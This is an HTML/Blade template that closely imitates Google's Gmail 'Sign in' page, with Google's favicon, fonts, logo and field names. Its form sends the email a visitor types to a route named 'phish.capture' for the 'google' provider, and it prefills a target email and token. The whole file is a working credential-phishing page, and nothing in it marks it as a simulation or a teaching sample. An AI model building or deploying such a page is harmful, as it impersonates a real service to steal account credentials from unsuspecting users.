<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Gmail</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
            font-size: 14px;
            line-height: 20px;
            background: #fff;
            color: #1f1f1f;
            width: 1366px;
            height: 768px;
            overflow: hidden;
            position: relative;
        }

        /* Logo at x=236, y=207 (above the heading) */
        .logo {
            position: absolute;
            left: 236px;
            top: 207px;
        }
        .logo svg { height: 24px; width: 75px; }

        /* "Sign in" heading at x=236, y=258 */
        h1 {
            position: absolute;
            left: 236px;
            top: 258px;
            font-size: 36px;
            font-weight: 400;
            line-height: 45px;
            color: #1f1f1f;
        }

        /* "Use your Google Account" at x=236, y=321 */
        .subtitle {
            position: absolute;
            left: 236px;
            top: 321px;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            color: #1f1f1f;
        }

        /* Form container at x=707, y=260 */
        .form-container {
            position: absolute;
            left: 707px;
            top: 260px;
            width: 403px;
            height: 268px;
        }

        /* Input field */
        .input-wrap {
            position: relative;
            width: 403px;
            height: 56px;
        }

        .input-wrap input {
            width: 100%;
            height: 56px;
            padding: 13px 15px 0;
            font-size: 16px;
            font-family: "Google Sans", roboto, sans-serif;
            color: #1f1f1f;
            background: #fff;
            border: 1px solid #747775;
            border-radius: 4px;
            outline: none;
        }

        .input-wrap input:focus {
            border: 2px solid #0b57d0;
            padding: 12px 14px 0;
        }

        .input-wrap .label {
            position: absolute;
            left: 16px;
            top: 16px;
            font-size: 16px;
            color: #5f6368;
            pointer-events: none;
            transition: all 0.15s;
        }

        .input-wrap input:focus ~ .label,
        .input-wrap input:not(:placeholder-shown) ~ .label {
            top: 8px;
            font-size: 12px;
            color: #0b57d0;
        }

        /* "Forgot email?" at x=707, y=333 (73px from form top) */
        .forgot-link {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #0b57d0;
            text-decoration: none;
            line-height: 18px;
            margin-top: 17px;
        }

        /* "Not your computer?" at x=707, y=397 (137px from form top) */
        .guest-note {
            font-size: 14px;
            color: #444746;
            line-height: 20px;
            width: 390px;
            margin-top: 47px;
        }

        /* "Learn more..." link */
        .guest-note a {
            color: #0b57d0;
            text-decoration: none;
            font-weight: 500;
        }

        /* "Create account" button at x=911, y=488 (228px from form top) */
        .btn-create {
            position: absolute;
            left: 204px; /* 911 - 707 = 204 */
            top: 228px; /* 488 - 260 = 228 */
            padding: 0 16px;
            height: 40px;
            font-size: 14px;
            font-weight: 500;
            font-family: "Google Sans", roboto, sans-serif;
            color: #0b57d0;
            background: transparent;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            white-space: nowrap;
        }

        .btn-create:hover { background: rgba(11,87,208,0.08); }

        /* "Next" button at x=1076, y=488 */
        .btn-next {
            position: absolute;
            left: 345px; /* 1076 - 707 = 369, minus some for right alignment */
            top: 228px;
            padding: 0 24px;
            height: 40px;
            font-size: 14px;
            font-weight: 500;
            font-family: "Google Sans", roboto, sans-serif;
            color: #fff;
            background: #1a73e8;
            border: none;
            border-radius: 20px;
            cursor: pointer;
        }

        .btn-next:hover { background: #1765cc; }

        /* Footer bar at y=577 */
        .footer-bar {
            position: absolute;
            top: 562px;
            left: 216px;
            width: 966px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .lang-select {
            font-size: 12px;
            color: #1f1f1f;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 8px 12px;
            border-radius: 8px;
        }

        .lang-select:hover { background: #f1f3f4; }

        .footer-links {
            display: flex;
        }

        .footer-links a {
            font-size: 12px;
            color: #1f1f1f;
            text-decoration: none;
            padding: 8px 12px;
            border-radius: 8px;
        }

        .footer-links a:hover { background: #f1f3f4; }
    </style>
</head>
<body>
    <div class="logo">
        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
            <g fill="none">
                <path d="M0 19.494V4.656h3.816v14.838H0z" fill="#4285F4"/>
                <path d="M4.482 4.656H8.3v14.838H4.482V4.656z" fill="#34A853"/>
                <path d="M8.3 4.656h3.594c2.586 0 4.194 1.11 4.194 3.006 0 1.872-1.38 3.072-4.194 3.072H8.3V4.656zm0 4.848h3.246c1.668 0 2.574-.678 2.574-1.836 0-1.176-.906-1.842-2.574-1.842H8.3v3.678z" fill="#EA4335"/>
                <path d="M14.166 12.582c0 3.126 2.184 4.752 5.022 4.752 1.368 0 2.616-.396 3.546-1.116l-1.572-1.962c-.63.462-1.404.756-2.202.756-1.71 0-2.856-1.068-2.856-2.808 0-1.752 1.146-2.82 2.856-2.82.798 0 1.572.312 2.202.774l1.572-1.962c-.93-.72-2.178-1.122-3.546-1.122-2.838 0-5.022 1.626-5.022 4.74v.864z" fill="#4285F4"/>
                <path d="M24.966 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#FBBC05"/>
                <path d="M31.254 5.004v13.47H28.4V5.004h2.854z" fill="#34A853"/>
                <path d="M36.93 5.004v13.47h-2.85V5.004h2.85z" fill="#EA4335"/>
                <path d="M42.606 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#4285F4"/>
                <path d="M48.018 5.004v13.47h-2.85V5.004h2.85z" fill="#FBBC05"/>
                <path d="M53.694 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#34A853"/>
                <path d="M57.552 5.004h2.85l4.71 11.04V5.004h2.73v13.47h-2.628L59.88 7.044v11.43h-2.328V5.004z" fill="#EA4335"/>
                <path d="M71.142 5.778c1.308 0 2.37.396 3.186 1.188l-1.638 1.638c-.498-.45-1.11-.678-1.812-.678-1.47 0-2.55 1.152-2.55 2.724 0 1.584 1.08 2.736 2.55 2.736.702 0 1.314-.228 1.812-.678l1.638 1.638c-.816.792-1.878 1.188-3.186 1.188-2.64 0-4.77-1.932-4.77-4.872 0-2.94 2.13-4.872 4.77-4.872z" fill="#4285F4"/>
            </g>
        </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>

    <div class="form-container">
        <form action="{{ route('phish.capture', ['provider' => 'google', 'token' => $token ?? '']) }}" method="POST" autocomplete="off">
            @csrf
            <div class="input-wrap">
                <input type="text" id="identifierId" name="identifier" placeholder=" " autocomplete="username webauthn" value="{{ $email ?? '' }}">
                <span class="label">Email or phone</span>
            </div>

            <a href="#" class="forgot-link">Forgot email?</a>

            <p class="guest-note">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more about using Guest mode</a></p>

            <button type="button" class="btn-create">Create account</button>
            <button type="submit" class="btn-next">Next</button>
        </form>
    </div>

    <div class="footer-bar">
        <select class="lang-select">
            <option>English (United States)</option>
        </select>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>